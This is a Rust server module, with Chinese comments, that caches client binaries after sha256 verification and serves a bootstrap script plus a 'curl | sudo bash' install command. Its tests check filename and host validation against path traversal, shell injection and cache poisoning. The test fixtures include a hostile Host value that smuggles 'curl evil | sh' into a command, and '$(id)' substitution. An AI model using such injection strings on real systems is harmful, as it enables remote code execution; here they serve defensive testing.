//! 客户端包缓存与 `/packages/*`、`/api/install-command`（spec §4.3 改动 2、§6）。
//!
//! v3 的做法是 `/install-client?key=<install key>` 发脚本、`/packages/<file>` 无 key 就能下
//! （审计 web-C8：这套 key 机制在安全上为零）。v4 把 key 整个删掉：引导脚本与二进制都公开可下，
//! 真正的门槛是订阅里的凭据。

use super::{assets, Shared};
use crate::api::AppState;
use crate::kernels::{sha256_hex, Fetcher, Manifest};
use crate::reconcile::DaemonCtx;
use crate::sys::Host;
use axum::extract::{Path as AxPath, State};
use axum::http::{header, StatusCode};
use axum::response::{IntoResponse, Response};
use axum::Json;
use serde_json::json;
use std::path::Path;
use std::sync::Arc;
use std::time::Duration;

/// 服务端替客户端缓存的二进制（spec §6「服务端内核缓存继续维护 sing-box 与 `bui-c` 的 Linux 二进制」）
pub const CLIENT_BINARIES: [&str; 2] = ["bui-c", "sing-box"];
pub const CLIENT_ARCHES: [&str; 2] = ["amd64", "arm64"];
pub const INSTALL_SCRIPT: &str = "bui-c-install.sh";
/// 引导脚本里的面板源占位符（`scripts/bui-c-install.sh` 的 `PANEL_SOURCE=` 那一行）。
///
/// 下发时替换成 `https://<期望态域名>/packages`，从面板拿到的那份于是默认就从面板自己
/// 取制品（交接手册 §3 第 4 条：默认的 GitHub `releases/latest` 在只有预发布时必然 404）。
/// v3 的 `web/server.js` 发 `install-client.sh` 时也是这么替换的（它用的是请求的 Host，
/// v4 不用，见 [`panel_host`]）。期望态域名不合 [`safe_host`] 时不替换，脚本按自己的
/// 逻辑回落 GitHub。
pub const PANEL_SOURCE_PLACEHOLDER: &str = "__BUI_C_PANEL_SOURCE__";
/// 每日缓存一次（与 P1 的每日 manifest 自检同频，但各跑各的）
pub const CACHE_INTERVAL_SECS: u64 = 86_400;

#[derive(Debug, Clone, Default, PartialEq)]
pub struct CacheReport {
    /// 文件名
    pub downloaded: Vec<String>,
    /// sha256 已一致
    pub skipped: Vec<String>,
    /// 非致命提示（如 client_sing_box 与 sing_box 版本不一致）
    pub notes: Vec<String>,
    pub errors: Vec<String>,
}

/// 文件名白名单校验（无 `/`、无 `\`、无 `..`、非空）
pub fn safe_name(name: &str) -> bool {
    !name.is_empty() && !name.contains('/') && !name.contains('\\') && !name.contains("..")
}

/// 面板域名只接受裸主机名（RFC 3986 的 reg-name 子集）加可选端口：`[A-Za-z0-9.-]+(:[0-9]{1,5})?`，
/// 端口 1..=65535，长度 < 256。这个值会被写进下发的引导脚本与 `/api/install-command` 的
/// 命令串，任何引号、`$`、`;` 都等于把 shell 注入交到 `sudo bash` 手里。
pub fn safe_host(h: &str) -> bool {
    if h.is_empty() || h.len() > 255 {
        return false;
    }
    // 只切第一个冒号：`host:port:1` 的 `port:1` 落进端口段，非纯数字 ⇒ 拒
    let (name, port) = match h.split_once(':') {
        Some((n, p)) => (n, Some(p)),
        None => (h, None),
    };
    if name.is_empty()
        || !name
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'.' || b == b'-')
    {
        return false;
    }
    // IPv6 字面量（`[::1]:443`）也一并拒掉：面板走域名，VPS 没有 IPv6 出口
    match port {
        None => true,
        Some(p) => {
            !p.is_empty()
                && p.len() <= 5
                && p.bytes().all(|b| b.is_ascii_digit())
                && p.parse::<u16>().is_ok_and(|n| n != 0)
        }
    }
}

/// **同步**函数（`Fetcher` 是同步 trait，`reqwest::blocking` 不能在 async 上下文跑）：
/// 只能在 `tokio::task::spawn_blocking` 里调用。
///
/// 下载的四个 artifact 键名就是总纲 C4 的键名 —— P4 的引导脚本按
/// `$BUI_C_SOURCE/<artifact 键名>` 取，键名对不上就下载不到。
pub fn sync_once(
    host: &dyn Host,
    fetcher: &dyn Fetcher,
    manifest: &Manifest,
    dir: &Path,
) -> CacheReport {
    let mut rep = CacheReport::default();
    // 决策 D8：C4 只有一组 sing-box artifact，两个版本号不等时只提示
    let sb = manifest.kernels.get("sing_box");
    let csb = manifest.kernels.get("client_sing_box");
    if let (Some(a), Some(b)) = (sb, csb) {
        if a != b {
            rep.notes.push(format!(
                "manifest 的 client_sing_box({b}) 与 sing_box({a}) 不一致，但 artifacts 只有一组 \
                 sing-box-linux-<arch>，缓存的是它"
            ));
        }
    }
    for name in CLIENT_BINARIES {
        for arch in CLIENT_ARCHES {
            let key = format!("{name}-linux-{arch}");
            let Some(asset) = manifest.artifacts.get(&key) else {
                rep.errors.push(format!("manifest 缺少 artifact：{key}"));
                continue;
            };
            let dest = dir.join(&key);
            // 跳过判断走流式 sha 而不是 `read_file`：这一步每轮缓存巡检对四个客户端二进制各跑
            // 一次（sing-box 单个几十 MB），而 `b-ui.service` 的 `MemoryMax=200M` 是硬上限。
            if host
                .file_sha256(&dest)
                .ok()
                .flatten()
                .map(|sum| sum == asset.sha256)
                .unwrap_or(false)
            {
                rep.skipped.push(key);
                continue;
            }
            let bytes = match fetcher.get_bytes(&asset.url) {
                Ok(b) => b,
                Err(e) => {
                    rep.errors.push(format!(
                        "{key} 下载失败：{}",
                        crate::redact::url_credentials(&e.to_string())
                    ));
                    continue;
                }
            };
            let got = sha256_hex(&bytes);
            if got != asset.sha256 {
                rep.errors.push(format!(
                    "{key} sha256 不符：期望 {} 实得 {got}",
                    asset.sha256
                ));
                continue;
            }
            match host.write_file(&dest, &bytes, 0o644) {
                Ok(()) => rep.downloaded.push(key),
                Err(e) => rep.errors.push(format!("{key} 写盘失败：{e}")),
            }
        }
    }
    rep
}

/// 每日一次：读 `<base>/manifest.json` 缓存 → [`sync_once`]
pub async fn cache_loop(ctx: DaemonCtx, shared: Arc<Shared>, fetcher: Arc<dyn Fetcher>) {
    let mut iv = tokio::time::interval(Duration::from_secs(CACHE_INTERVAL_SECS));
    iv.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
    loop {
        iv.tick().await;
        let host = ctx.host.clone();
        let paths = ctx.paths.clone();
        let dir = shared.packages_dir();
        let f = fetcher.clone();
        // `Fetcher` 是同步 trait（reqwest::blocking 在 async 上下文会 panic）⇒ 必须 spawn_blocking
        let rep = tokio::task::spawn_blocking(move || {
            let m = crate::serve::load_cached_manifest(host.as_ref(), &paths)?;
            Some(sync_once(host.as_ref(), f.as_ref(), &m, &dir))
        })
        .await
        .ok()
        .flatten();
        match rep {
            None => tracing::debug!("还没有 manifest 缓存，跳过本轮客户端包缓存"),
            Some(r) => {
                for n in &r.notes {
                    tracing::warn!(note = %n, "客户端包缓存提示");
                }
                for e in &r.errors {
                    tracing::warn!(error = %e, "客户端包缓存失败项");
                }
                if !r.downloaded.is_empty() {
                    tracing::info!(files = ?r.downloaded, "客户端包缓存已更新");
                }
            }
        }
    }
}

/// `/api/install-command` 回的那条命令（无鉴权，**不带 install key**，spec §4.3 改动 2）
pub fn install_command(host: &str) -> String {
    // 沿用 v3 的 `--noproxy '*'`（机房里客户端可能有 http_proxy 环境变量），但**去掉 v3 的 `-k`**：
    // v4 的面板证书由 Caddy 正规签发（P1 Task 11），`-k` 已无必要，而它会把这条
    // pipe-to-sudo 命令的可信度削掉一半（中间人可以换掉脚本）。也**不带 install key**
    // （spec §4.3 改动 2）。`BUI_C_SOURCE` 让引导脚本优先从本面板取二进制（P4 决策 9）。
    format!(
        "curl -fsSL --noproxy '*' 'https://{host}/packages/{INSTALL_SCRIPT}' | sudo BUI_C_SOURCE='https://{host}/packages' bash"
    )
}

/// 面板域名：**只**取期望态的 `node.domain`，过 [`safe_host`] 才用，不过（含空）⇒ `None`。
///
/// 不读请求的 `Host` 头：形状正确的任意 Host（`evil.example`）都能让响应里的面板地址
/// 指向别处，前面一旦加缓存就是缓存投毒。`/api/install-command` 与
/// `/packages/bui-c-install.sh` 的占位符替换共用这一处取法，免得两边给出的面板地址对不上。
async fn panel_host(app: &AppState) -> Option<String> {
    let domain = app.store.read().await.node.domain.clone();
    safe_host(&domain).then_some(domain)
}

/// 把引导脚本正文里的 [`PANEL_SOURCE_PLACEHOLDER`] 换成本面板的 `/packages`；
/// `host` 为 `None`（期望态域名不合法）时原样发出，脚本保留字面占位符、自行回落 GitHub。
fn fill_panel_source(bytes: Vec<u8>, host: Option<&str>) -> Vec<u8> {
    let Some(host) = host else {
        return bytes;
    };
    // 脚本是仓库里的 UTF-8 文本；真出现非法字节时宁可原样发出，也不要 500（同 assets::web_file）
    match String::from_utf8(bytes) {
        Ok(text) => text
            .replace(
                PANEL_SOURCE_PLACEHOLDER,
                &format!("https://{host}/packages"),
            )
            .into_bytes(),
        Err(e) => e.into_bytes(),
    }
}

async fn get_install_command(State(app): State<AppState>) -> Response {
    let Some(host) = panel_host(&app).await else {
        return (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(json!({"error": "期望态里的面板域名不合法，生成不了安装命令"})),
        )
            .into_response();
    };
    Json(json!({
        "command": install_command(&host),
        "server": host,
        "note": "在客户端机器上执行；脚本只负责第一次把 bui-c 装上，之后用 `bui-c update` 升级",
    }))
    .into_response()
}

async fn get_manifest(shared: Arc<Shared>) -> Response {
    let path = crate::paths::manifest_file(&shared.paths());
    match std::fs::read(&path) {
        Ok(bytes) => (
            StatusCode::OK,
            [(header::CONTENT_TYPE, "application/json; charset=utf-8")],
            bytes,
        )
            .into_response(),
        Err(_) => (
            StatusCode::NOT_FOUND,
            Json(json!({"error": "manifest not cached"})),
        )
            .into_response(),
    }
}

/// `/packages/{name}`。引导脚本（盘上的与嵌入的两条路都算）发出前把面板源占位符
/// 换成本面板的 `/packages`；其余文件（二进制等）原样透传。
async fn get_package(
    AxPath(name): AxPath<String>,
    State(app): State<AppState>,
    shared: Arc<Shared>,
) -> Response {
    if !safe_name(&name) {
        return (
            StatusCode::BAD_REQUEST,
            Json(json!({"error": "Invalid filename"})),
        )
            .into_response();
    }
    let ct = assets::content_type(&name);
    if let Ok(bytes) = std::fs::read(shared.packages_dir().join(&name)) {
        let bytes = if name == INSTALL_SCRIPT {
            fill_panel_source(bytes, panel_host(&app).await.as_deref())
        } else {
            bytes
        };
        return (StatusCode::OK, [(header::CONTENT_TYPE, ct)], bytes).into_response();
    }
    // 引导脚本不在盘上：直接发嵌进二进制的那一份（永远与本机 bui 同版本）
    if name == INSTALL_SCRIPT {
        if let Some(bytes) = assets::install_script() {
            let bytes = fill_panel_source(bytes, panel_host(&app).await.as_deref());
            return (StatusCode::OK, [(header::CONTENT_TYPE, ct)], bytes).into_response();
        }
    }
    (
        StatusCode::NOT_FOUND,
        Json(json!({"error": "File not found"})),
    )
        .into_response()
}

/// 三条公开路由：`/api/install-command`、`/packages/manifest.json`、`/packages/{file}`
///
/// `/packages/manifest.json` 单独一条路由：manifest 在 `<base>/manifest.json`
/// （不是 `packages/` 里），两条路径不能共用一个 handler。
pub fn public_routes(shared: Arc<Shared>) -> axum::Router<AppState> {
    use axum::routing::get;
    let s_m = shared.clone();
    let s_p = shared.clone();
    axum::Router::new()
        .route("/api/install-command", get(get_install_command))
        .route(
            "/packages/manifest.json",
            get(move || get_manifest(s_m.clone())),
        )
        .route(
            "/packages/{name}",
            get(move |p: AxPath<String>, st: State<AppState>| get_package(p, st, s_p.clone())),
        )
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::kernels::{Asset, Manifest};
    use crate::modules::panel::testsupport::{full_with, harness, mount, raw, send};
    use crate::sys::fake::FakeHost;
    use pretty_assertions::assert_eq;
    use std::collections::BTreeMap;
    use std::sync::Mutex;

    struct FakeFetcher(Mutex<BTreeMap<String, Vec<u8>>>);
    impl crate::kernels::Fetcher for FakeFetcher {
        fn get_bytes(&self, url: &str) -> anyhow::Result<Vec<u8>> {
            self.0
                .lock()
                .unwrap()
                .get(url)
                .cloned()
                .ok_or_else(|| anyhow::anyhow!("404 {url}"))
        }
    }

    fn manifest_with(bytes: &[u8]) -> Manifest {
        let sha = crate::kernels::sha256_hex(bytes);
        let mut artifacts = BTreeMap::new();
        for name in CLIENT_BINARIES {
            for arch in CLIENT_ARCHES {
                artifacts.insert(
                    format!("{name}-linux-{arch}"),
                    Asset {
                        url: format!("https://x/{name}-{arch}"),
                        sha256: sha.clone(),
                    },
                );
            }
        }
        Manifest {
            version: "4.0.0".into(),
            kernels: BTreeMap::from([
                ("sing_box".to_string(), "1.14.5".to_string()),
                ("client_sing_box".to_string(), "1.14.5".to_string()),
            ]),
            artifacts,
            min_upgrade_from: None,
            tag: None,
        }
    }

    fn fetcher_for(m: &Manifest, bytes: &[u8]) -> FakeFetcher {
        FakeFetcher(Mutex::new(
            m.artifacts
                .values()
                .map(|a| (a.url.clone(), bytes.to_vec()))
                .collect(),
        ))
    }

    #[test]
    fn safe_name_rejects_traversal() {
        assert!(safe_name("bui-c-linux-amd64"));
        assert!(safe_name("manifest.json"));
        assert!(!safe_name(""));
        assert!(!safe_name("../state.json"));
        assert!(!safe_name("a/b"));
        assert!(!safe_name("a\\b"));
    }

    #[test]
    fn install_command_has_no_key_and_points_at_the_panel() {
        let c = install_command("panel.example.com");
        assert_eq!(
            c,
            "curl -fsSL --noproxy '*' 'https://panel.example.com/packages/bui-c-install.sh' \
             | sudo BUI_C_SOURCE='https://panel.example.com/packages' bash"
        );
        assert!(
            !c.contains(" -k "),
            "v4 面板证书由 Caddy 正规签发，不能跳过校验"
        );
        assert!(
            !c.contains("key="),
            "spec §4.3 改动 2：install key 机制已删除"
        );
    }

    #[test]
    fn sync_once_downloads_four_artifacts_and_verifies_sha256() {
        let h = FakeHost::new();
        let m = manifest_with(b"ELF-bytes");
        let f = fetcher_for(&m, b"ELF-bytes");
        let dir = std::path::Path::new("/opt/b-ui/packages");
        let rep = sync_once(&h, &f, &m, dir);
        assert_eq!(rep.errors, Vec::<String>::new());
        let mut got = rep.downloaded.clone();
        got.sort();
        assert_eq!(
            got,
            vec![
                "bui-c-linux-amd64".to_string(),
                "bui-c-linux-arm64".to_string(),
                "sing-box-linux-amd64".to_string(),
                "sing-box-linux-arm64".to_string(),
            ]
        );
        assert_eq!(h.mode("/opt/b-ui/packages/bui-c-linux-amd64"), Some(0o644));
        assert_eq!(
            h.text("/opt/b-ui/packages/sing-box-linux-arm64").as_deref(),
            Some("ELF-bytes")
        );
    }

    #[test]
    fn sync_once_skips_files_that_already_match() {
        let h = FakeHost::new();
        let m = manifest_with(b"ELF-bytes");
        let f = fetcher_for(&m, b"ELF-bytes");
        let dir = std::path::Path::new("/opt/b-ui/packages");
        sync_once(&h, &f, &m, dir);
        h.clear_ops();
        let rep = sync_once(&h, &f, &m, dir);
        assert!(rep.downloaded.is_empty());
        assert_eq!(rep.skipped.len(), 4);
        assert!(
            h.ops().iter().all(|o| !o.starts_with("write:")),
            "第二轮不该写盘：{:?}",
            h.ops()
        );
    }

    #[test]
    fn a_sha256_mismatch_is_an_error_and_writes_nothing() {
        let h = FakeHost::new();
        let m = manifest_with(b"ELF-bytes");
        // fetcher 返回的不是 manifest 里记的那份内容
        let f = fetcher_for(&m, b"tampered");
        let rep = sync_once(&h, &f, &m, std::path::Path::new("/opt/b-ui/packages"));
        assert!(rep.downloaded.is_empty());
        assert_eq!(rep.errors.len(), 4, "{:?}", rep.errors);
        assert!(rep.errors[0].contains("sha256"), "{:?}", rep.errors);
        assert_eq!(h.text("/opt/b-ui/packages/bui-c-linux-amd64"), None);
    }

    #[test]
    fn a_missing_artifact_key_is_an_error_not_a_panic() {
        let h = FakeHost::new();
        let mut m = manifest_with(b"ELF-bytes");
        m.artifacts.remove("bui-c-linux-arm64");
        let f = fetcher_for(&m, b"ELF-bytes");
        let rep = sync_once(&h, &f, &m, std::path::Path::new("/opt/b-ui/packages"));
        assert_eq!(rep.downloaded.len(), 3);
        assert!(
            rep.errors.iter().any(|e| e.contains("bui-c-linux-arm64")),
            "{:?}",
            rep.errors
        );
    }

    #[test]
    fn a_client_singbox_version_mismatch_only_notes_it() {
        let h = FakeHost::new();
        let mut m = manifest_with(b"ELF-bytes");
        m.kernels.insert("client_sing_box".into(), "1.13.19".into());
        let f = fetcher_for(&m, b"ELF-bytes");
        let rep = sync_once(&h, &f, &m, std::path::Path::new("/opt/b-ui/packages"));
        assert_eq!(rep.errors, Vec::<String>::new(), "决策 D8：只提示，照缓存");
        assert!(
            rep.notes.iter().any(|n| n.contains("client_sing_box")),
            "{:?}",
            rep.notes
        );
        assert_eq!(rep.downloaded.len(), 4);
    }

    #[tokio::test]
    async fn install_command_uses_the_state_domain() {
        let h = harness().await;
        let r = mount(&h.app, public_routes(h.shared.clone()));
        let (s, v) = send(&r, "GET", "/api/install-command", None, None).await;
        assert_eq!(s, axum::http::StatusCode::OK);
        assert_eq!(v["server"], "example.com");
        assert_eq!(v["command"], install_command("example.com"));
        assert!(v.get("key").is_none(), "绝不能再回 install key");
        assert!(v["note"].as_str().unwrap().contains("bui-c"), "{v}");
    }

    #[tokio::test]
    async fn packages_are_downloadable_without_a_key_and_reject_traversal() {
        let h = harness().await;
        std::fs::create_dir_all(h.shared.packages_dir()).unwrap();
        std::fs::write(h.shared.packages_dir().join("bui-c-linux-amd64"), b"ELF").unwrap();
        std::fs::write(
            crate::paths::manifest_file(&h.paths),
            br#"{"version":"4.0.0"}"#,
        )
        .unwrap();
        // 整套装配，公开路由挂本文件的 public_routes()（PanelModule 要到 T13 才接线）
        let router = full_with(&h.app, axum::Router::new(), public_routes(h.shared.clone()));
        let (s, headers, bytes) =
            raw(&router, "GET", "/packages/bui-c-linux-amd64", None, None).await;
        assert_eq!(s, axum::http::StatusCode::OK);
        assert_eq!(bytes, b"ELF");
        assert_eq!(headers["content-type"], "application/octet-stream");
        let (sm, _, mb) = raw(&router, "GET", "/packages/manifest.json", None, None).await;
        assert_eq!(sm, axum::http::StatusCode::OK);
        assert_eq!(mb, br#"{"version":"4.0.0"}"#);
        let (s404, _, _) = raw(&router, "GET", "/packages/nope", None, None).await;
        assert_eq!(s404, axum::http::StatusCode::NOT_FOUND);
        let (sbad, _, _) = raw(&router, "GET", "/packages/..%2fstate.json", None, None).await;
        assert_eq!(sbad, axum::http::StatusCode::BAD_REQUEST);
    }

    /// `testsupport::raw` 不带自定义请求头，而它的签名被别的测试用着（不动它）：
    /// 这里自己构造一个带 `Host` 的请求。
    async fn get_with_host(
        router: &axum::Router,
        uri: &str,
        host: &str,
    ) -> (StatusCode, axum::http::HeaderMap, Vec<u8>) {
        use tower::ServiceExt;
        let req = axum::http::Request::builder()
            .method("GET")
            .uri(uri)
            .header(header::HOST, host)
            .body(axum::body::Body::empty())
            .unwrap();
        let res = router.clone().oneshot(req).await.unwrap();
        let status = res.status();
        let headers = res.headers().clone();
        let bytes = axum::body::to_bytes(res.into_body(), 8 * 1024 * 1024)
            .await
            .unwrap()
            .to_vec();
        (status, headers, bytes)
    }

    #[tokio::test]
    async fn the_installer_script_comes_from_the_embed_when_it_is_not_on_disk() {
        let h = harness().await;
        let router = full_with(&h.app, axum::Router::new(), public_routes(h.shared.clone()));
        let (s, headers, bytes) =
            raw(&router, "GET", "/packages/bui-c-install.sh", None, None).await;
        assert_eq!(s, axum::http::StatusCode::OK);
        assert_eq!(headers["content-type"], "text/x-shellscript; charset=utf-8");
        let text = String::from_utf8(bytes).unwrap();
        // 下发的那份必须指向本面板的 /packages，否则客户端又会去问 GitHub 的 releases/latest
        assert!(
            !text.contains(PANEL_SOURCE_PLACEHOLDER),
            "下发的脚本还留着占位符"
        );
        assert!(
            text.contains(r#"PANEL_SOURCE="https://example.com/packages""#),
            "占位符没换成期望态域名：{text}"
        );
        assert!(
            text.contains("BUI_C_SOURCE"),
            "BUI_C_SOURCE 的用法说明要留着（P4 决策 9）"
        );
        // 嵌进二进制的原件不动，替换只发生在发出去的那一份上
        let embedded = String::from_utf8(assets::install_script().unwrap()).unwrap();
        assert!(
            embedded.contains(PANEL_SOURCE_PLACEHOLDER),
            "嵌入的原件不该被改"
        );
    }

    #[tokio::test]
    async fn an_on_disk_installer_script_gets_the_panel_source_too_but_other_files_dont() {
        let h = harness().await;
        h.store
            .update(|s| s.node.domain = "panel.example.com".into())
            .await
            .unwrap();
        std::fs::create_dir_all(h.shared.packages_dir()).unwrap();
        // 盘上那份（P5 的包缓存放进来的）也要替换，不能只替换嵌入的那条路
        std::fs::write(
            h.shared.packages_dir().join(INSTALL_SCRIPT),
            b"#!/usr/bin/env bash\nPANEL_SOURCE=\"__BUI_C_PANEL_SOURCE__\"\n",
        )
        .unwrap();
        // 二进制里恰好有这串字节时也不能动它：替换只对引导脚本做
        std::fs::write(
            h.shared.packages_dir().join("bui-c-linux-amd64"),
            PANEL_SOURCE_PLACEHOLDER.as_bytes(),
        )
        .unwrap();
        let router = full_with(&h.app, axum::Router::new(), public_routes(h.shared.clone()));

        let (s, _, bytes) =
            get_with_host(&router, "/packages/bui-c-install.sh", "panel.example.com").await;
        assert_eq!(s, axum::http::StatusCode::OK);
        assert_eq!(
            String::from_utf8(bytes).unwrap(),
            "#!/usr/bin/env bash\nPANEL_SOURCE=\"https://panel.example.com/packages\"\n"
        );

        let (sb, _, bb) =
            get_with_host(&router, "/packages/bui-c-linux-amd64", "panel.example.com").await;
        assert_eq!(sb, axum::http::StatusCode::OK);
        assert_eq!(bb, PANEL_SOURCE_PLACEHOLDER.as_bytes(), "二进制被改动了");
    }

    /// 这个 Host 头会被写进下发给 `curl … | sudo bash` 的脚本与 `/api/install-command`
    /// 的命令串，所以引号、`$`、`;` 都等于把 shell 注入交到 sudo 手里。
    const HOSTILE_HOST: &str = r#"x.example.com"; curl evil | sh #"#;
    /// 请求的 Host 头一律不采信：形状不对的（注入）与形状正确但指向别处的（缓存投毒）都算
    const FOREIGN_HOSTS: [&str; 3] = [HOSTILE_HOST, "evil.example", "evil.example:8443"];

    #[test]
    fn safe_host_accepts_hostnames_with_optional_port_and_rejects_shell_metacharacters() {
        assert!(safe_host("panel.example.com"));
        assert!(safe_host("panel.example.com:8443"));
        assert!(safe_host("127.0.0.1"));
        assert!(!safe_host(""));
        assert!(!safe_host(r#"a"b"#));
        assert!(!safe_host(HOSTILE_HOST));
        assert!(!safe_host("$(id).example.com"));
        assert!(!safe_host("a b"));
        assert!(!safe_host("host:port:1"));
        assert!(!safe_host("host:abc"));
        assert!(!safe_host(&"a".repeat(256)), "长度要卡在 255 字节以内");
        // 端口 1..=65535
        assert!(safe_host("panel.example.com:1"));
        assert!(safe_host("panel.example.com:65535"));
        assert!(!safe_host("panel.example.com:0"));
        assert!(!safe_host("panel.example.com:65536"));
        assert!(!safe_host("panel.example.com:99999"));
        assert!(!safe_host("panel.example.com:"));
    }

    #[tokio::test]
    async fn the_host_header_never_reaches_the_installer_script() {
        let h = harness().await;
        let domain = h.app.store.read().await.node.domain.clone();
        let router = full_with(&h.app, axum::Router::new(), public_routes(h.shared.clone()));
        let want = String::from_utf8(assets::install_script().unwrap())
            .unwrap()
            .replace(
                PANEL_SOURCE_PLACEHOLDER,
                &format!("https://{domain}/packages"),
            );
        for host in FOREIGN_HOSTS {
            let (s, _, bytes) = get_with_host(&router, "/packages/bui-c-install.sh", host).await;
            assert_eq!(s, axum::http::StatusCode::OK);
            let text = String::from_utf8(bytes).unwrap();
            assert!(
                !text.contains("evil"),
                "Host `{host}` 被写进了下发的引导脚本：{text}"
            );
            assert_eq!(text, want, "Host `{host}` 改变了下发的脚本");
        }
    }

    #[tokio::test]
    async fn install_command_ignores_the_host_header() {
        let h = harness().await;
        let domain = h.app.store.read().await.node.domain.clone();
        let router = mount(&h.app, public_routes(h.shared.clone()));
        for host in FOREIGN_HOSTS {
            let (s, _, bytes) = get_with_host(&router, "/api/install-command", host).await;
            assert_eq!(s, axum::http::StatusCode::OK);
            let v: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
            assert!(
                !v["command"].as_str().unwrap().contains("evil"),
                "Host `{host}` 被拼进了 pipe-to-sudo 的命令串：{v}"
            );
            assert_eq!(v["command"], install_command(&domain));
            assert_eq!(v["server"], domain);
        }
    }

    /// 期望态域名不合 [`safe_host`]（空、注入、端口越界）⇒ 不替换，脚本原样发出、保留字面
    /// 占位符，由脚本自己回落 GitHub；也绝不拿请求的 Host 顶上。安装命令则不给。
    #[tokio::test]
    async fn an_invalid_state_domain_leaves_the_placeholder_verbatim() {
        let original = assets::install_script().unwrap();
        for bad in ["", HOSTILE_HOST, "panel.example.com:70000"] {
            let h = harness().await;
            h.store
                .update(|s| s.node.domain = bad.to_string())
                .await
                .unwrap();
            let router = full_with(&h.app, axum::Router::new(), public_routes(h.shared.clone()));
            let (s, _, bytes) =
                get_with_host(&router, "/packages/bui-c-install.sh", "panel.example.com").await;
            assert_eq!(s, axum::http::StatusCode::OK);
            assert_eq!(bytes, original, "期望态域名 `{bad}` 不合法时脚本应原样发出");
            let text = String::from_utf8(bytes).unwrap();
            assert!(
                text.contains(r#"PANEL_SOURCE="__BUI_C_PANEL_SOURCE__""#),
                "占位符应原样保留：{text}"
            );

            let (sc, _, cb) =
                get_with_host(&router, "/api/install-command", "panel.example.com").await;
            assert_eq!(sc, axum::http::StatusCode::INTERNAL_SERVER_ERROR);
            let v: serde_json::Value = serde_json::from_slice(&cb).unwrap();
            assert!(v.get("command").is_none(), "不合法的域名不能拼进命令：{v}");
        }
    }
}
